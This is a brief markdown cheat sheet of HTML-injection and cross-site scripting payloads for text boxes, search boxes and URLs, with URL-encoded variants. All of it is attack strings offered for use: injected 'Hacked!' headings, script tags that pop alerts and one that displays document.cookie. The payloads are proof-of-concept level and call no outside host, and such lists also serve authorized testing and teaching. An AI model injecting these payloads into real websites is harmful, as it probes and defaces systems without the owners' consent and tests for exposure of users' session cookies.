# HTML Payloads

## Text Box / Search Box 
`<h1>Hacked!</h1>`

`<h1 style="color:red;">Hacked!</h1>`

`<script>alert('XSS!')</script>.png`

`<script>alert(document.cookie)</script>`

## URL
 Add `?` infront of aby of the payload's listed in this doc

 ## HTML or URL Encoding
`%3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E`

`%3Cscript%3Ealert(document.cookie)%3C/script%3E`
